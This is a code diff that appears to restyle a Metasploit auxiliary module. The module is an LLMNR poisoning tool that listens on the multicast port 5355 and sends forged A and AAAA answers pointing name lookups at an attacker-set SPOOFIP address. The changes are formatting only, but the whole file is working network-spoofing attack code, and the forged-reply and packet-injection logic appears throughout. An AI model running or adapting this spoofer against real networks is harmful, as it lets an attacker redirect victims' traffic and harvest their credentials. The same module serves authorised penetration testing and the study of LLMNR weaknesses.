@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,11 +10,9 @@ require 'ipaddr'
 require 'net/dns'
 
 class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Capture
 
-include Msf::Exploit::Capture
-
-attr_accessor :sock, :thread
-
+  attr_accessor :sock, :thread
 
   def initialize
     super(
@@ -30,7 +29,7 @@ attr_accessor :sock, :thread
           [ 'URL', 'http://www.ietf.org/rfc/rfc4795.txt' ]
         ],
 
-        'Actions'     =>
+      'Actions' =>
         [
           [ 'Service' ]
         ],
@@ -42,10 +41,10 @@ attr_accessor :sock, :thread
     )
 
     register_options([
-      OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", ""]),
-      OptRegexp.new('REGEX', [ true, "Regex applied to the LLMNR Name to determine if spoofed reply is sent", '.*']),
-      OptInt.new('TTL', [ false, "Time To Live for the spoofed response", 30]),
-    ])
+                       OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", ""]),
+                       OptRegexp.new('REGEX', [ true, "Regex applied to the LLMNR Name to determine if spoofed reply is sent", '.*']),
+                       OptInt.new('TTL', [ false, "Time To Live for the spoofed response", 30])
+                     ])
 
     deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
     self.thread = nil
@@ -58,9 +57,7 @@ attr_accessor :sock, :thread
     # `recvfrom` (on Linux at least) will give us an ipv6/ipv4 mapped
     # addr like "::ffff:192.168.0.1" when the interface we're listening
     # on has an IPv6 address. Convert it to just the v4 addr
-    if rhost.ipv4_mapped?
-      rhost = rhost.native
-    end
+    rhost = rhost.native if rhost.ipv4_mapped?
 
     dns_pkt = ::Net::DNS::Packet.parse(packet)
     spoof = ::IPAddr.new(datastore['SPOOFIP'])
@@ -84,19 +81,19 @@ attr_accessor :sock, :thread
       case question.qType.to_i
       when ::Net::DNS::A
         dns_pkt.answer << ::Net::DNS::RR::A.new(
-          :name => name,
-          :ttl => datastore['TTL'],
-          :cls => ::Net::DNS::IN,
-          :type => ::Net::DNS::A,
-          :address => spoof.to_s
+          name: name,
+          ttl: datastore['TTL'],
+          cls: ::Net::DNS::IN,
+          type: ::Net::DNS::A,
+          address: spoof.to_s
         )
       when ::Net::DNS::AAAA
         dns_pkt.answer << ::Net::DNS::RR::AAAA.new(
-          :name => name,
-          :ttl => datastore['TTL'],
-          :cls => ::Net::DNS::IN,
-          :type => ::Net::DNS::AAAA,
-          :address => (spoof.ipv6? ? spoof : spoof.ipv4_mapped).to_s
+          name: name,
+          ttl: datastore['TTL'],
+          cls: ::Net::DNS::IN,
+          type: ::Net::DNS::AAAA,
+          address: (spoof.ipv6? ? spoof : spoof.ipv4_mapped).to_s
         )
       else
         print_warning("#{rhost.to_s.ljust 16} llmnr - Unknown RR type, this shouldn't happen. Skipping")
@@ -109,24 +106,24 @@ attr_accessor :sock, :thread
     return if dns_pkt.answer.empty?
 
     udp = ::PacketFu::UDPHeader.new(
-      :udp_src => 5355,
-      :udp_dst => src_port,
-      :body => dns_pkt.data
+      udp_src: 5355,
+      udp_dst: src_port,
+      body: dns_pkt.data
     )
     udp.udp_recalc
     if rhost.ipv4?
       ip_pkt = ::PacketFu::IPPacket.new(
-        :ip_src => spoof.hton,
-        :ip_dst => rhost.hton,
-        :ip_proto => 0x11, # UDP
-        :body => udp
+        ip_src: spoof.hton,
+        ip_dst: rhost.hton,
+        ip_proto: 0x11, # UDP
+        body: udp
       )
     elsif rhost.ipv6?
       ip_pkt = ::PacketFu::IPv6Packet.new(
-        :ipv6_src => spoof.hton,
-        :ipv6_dst => rhost.hton,
-        :ip_proto => 0x11, # UDP
-        :body => udp
+        ipv6_src: spoof.hton,
+        ipv6_dst: rhost.hton,
+        ip_proto: 0x11, # UDP
+        body: udp
       )
     else
       # Should never get here
@@ -139,20 +136,19 @@ attr_accessor :sock, :thread
   end
 
   def monitor_socket
-    while true
-      rds = [self.sock]
+    loop do
+      rds = [sock]
       wds = []
-      eds = [self.sock]
+      eds = [sock]
 
-      r,_,_ = ::IO.select(rds,wds,eds,0.25)
+      r, = ::IO.select(rds, wds, eds, 0.25)
 
-      if (r != nil and r[0] == self.sock)
-        packet, host, port = self.sock.recvfrom(65535)
+      if !r.nil? && (r[0] == sock)
+        packet, host, port = sock.recvfrom(65535)
         dispatch_request(packet, host, port)
       end
     end
   end
-
 
   # Don't spam with success, just throttle to every 10 seconds
   # per host
@@ -161,7 +157,7 @@ attr_accessor :sock, :thread
     now = Time.now.utc
     @notified_times[host] ||= now
     last_notified = now - @notified_times[host]
-    if last_notified == 0 or last_notified > 10
+    if (last_notified == 0) || last_notified > 10
       @notified_times[host] = now
     else
       false
@@ -169,11 +165,11 @@ attr_accessor :sock, :thread
   end
 
   def run
-    check_pcaprub_loaded()
-    ::Socket.do_not_reverse_lookup = true  # Mac OS X workaround
+    check_pcaprub_loaded
+    ::Socket.do_not_reverse_lookup = true # Mac OS X workaround
 
     # Avoid receiving extraneous traffic on our send socket
-    open_pcap({'FILTER' => 'ether host f0:f0:f0:f0:f0:f0'})
+    open_pcap('FILTER' => 'ether host f0:f0:f0:f0:f0:f0')
 
     # Multicast Address for LLMNR
     multicast_addr = ::IPAddr.new("224.0.0.252")
@@ -182,7 +178,11 @@ attr_accessor :sock, :thread
     # multicast packets from. If the address is INADDR_ANY, we get them
     # from all interfaces, so try to restrict if we can, but fall back
     # if we can't
-    bind_addr = get_ipv4_addr(datastore["INTERFACE"]) rescue "0.0.0.0"
+    bind_addr = begin
+                    get_ipv4_addr(datastore["INTERFACE"])
+                  rescue
+                    "0.0.0.0"
+                  end
 
     optval = multicast_addr.hton + ::IPAddr.new(bind_addr).hton
     self.sock = Rex::Socket.create_udp(
@@ -191,8 +191,8 @@ attr_accessor :sock, :thread
       'LocalPort' => 5355,
       'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
     )
-    self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
-    self.sock.setsockopt(::Socket::IPPROTO_IP, ::Socket::IP_ADD_MEMBERSHIP, optval)
+    sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
+    sock.setsockopt(::Socket::IPPROTO_IP, ::Socket::IP_ADD_MEMBERSHIP, optval)
 
     self.thread = Rex::ThreadFactory.spawn("LLMNRServerMonitor", false) {
       monitor_socket
@@ -200,14 +200,14 @@ attr_accessor :sock, :thread
 
     print_status("LLMNR Spoofer started. Listening for LLMNR requests with REGEX \"#{datastore['REGEX']}\" ...")
 
-    add_socket(self.sock)
+    add_socket(sock)
 
-    self.thread.join
+    thread.join
   end
 
   def cleanup
-    if self.thread and self.thread.alive?
-      self.thread.kill
+    if thread && thread.alive?
+      thread.kill
       self.thread = nil
     end
     close_pcap
